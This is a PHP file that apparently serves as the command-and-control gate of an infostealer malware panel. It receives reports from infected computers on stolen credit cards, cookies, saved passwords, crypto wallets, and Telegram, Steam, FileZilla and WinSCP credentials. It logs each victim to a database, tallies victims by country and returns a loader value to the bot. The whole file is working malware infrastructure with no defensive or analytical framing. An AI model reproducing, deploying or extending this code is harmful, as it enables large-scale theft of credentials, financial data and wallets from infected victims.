<?php
require("mysql.php");

if(
!is_numeric($_POST['cc']) ||
!is_numeric($_POST['desk']) ||
!is_numeric($_POST['autof']) ||
!is_numeric($_POST['cookies']) ||
!is_numeric($_POST['filezilla']) ||
!is_numeric($_POST['passwords']) ||
!is_numeric($_POST['telegram']) ||
!is_numeric($_POST['wallet']) ||
!is_numeric($_POST['pidgin']) ||
!is_numeric($_POST['psi']) ||
!is_numeric($_POST['psiplus']) ||
!ctype_xdigit($_POST['file']) ||
!is_numeric($_POST['steam'])	
){
	die('FUCK OFF!!');
}


$asnw = $base->query("SELECT * FROM `loader`")->fetchAll();
echo($asnw[0][0]);

$param = ['file' => $_POST['file'], 'country' => $_POST['country'], 'cc' => $_POST['cc'], 'desk' => $_POST['desk'], 'autof' => $_POST['autof'], 'cookies' => $_POST['cookies'], 'filezilla' => $_POST['filezilla'], 'passwords' => $_POST['passwords'], 'telegram' => $_POST['telegram'], 'wallet' => $_POST['wallet'], 'winver' => $_POST['winver'], 'pidgin' => $_POST['pidgin'], 'psi' => $_POST['psi'], 'psiplus' => $_POST['psiplus'], 'steam' => $_POST['steam'], 'battle' => $_POST['battle'], 'winscp' => $_POST['winscp']];
$quary = $base->prepare("INSERT INTO `users` (country, winver, cc, desk, autof, cookies, filezilla, passwords, telegram, wallet, pidgin, psi, psiplus, steam, file, BattleNet, WINSCP) VALUES  (:country, :winver, :cc, :desk, :autof, :cookies, :filezilla, :passwords, :telegram, :wallet, :pidgin, :psi, :psiplus, :steam, :file, :battle, :winscp)");
$quary->execute($param); 

$param = ['country' => $_POST['country']];
$chkctr = $base->prepare("SELECT * FROM `country` WHERE country=:country");
$chkctr->execute($param);
$otp = $chkctr->fetchAll();

if(count($otp) == 0){
	$param = ['country' => $_POST['country']];
	$quary = $base->prepare("INSERT INTO `country`(`country`, `amount`) VALUES (:country, 0)");
	$quary->execute($param); 
}

$param = ['country' => $_POST['country']];
$quary = $base->prepare("UPDATE `country` SET amount=amount+1 WHERE country=:country");
$quary->execute($param); 

?>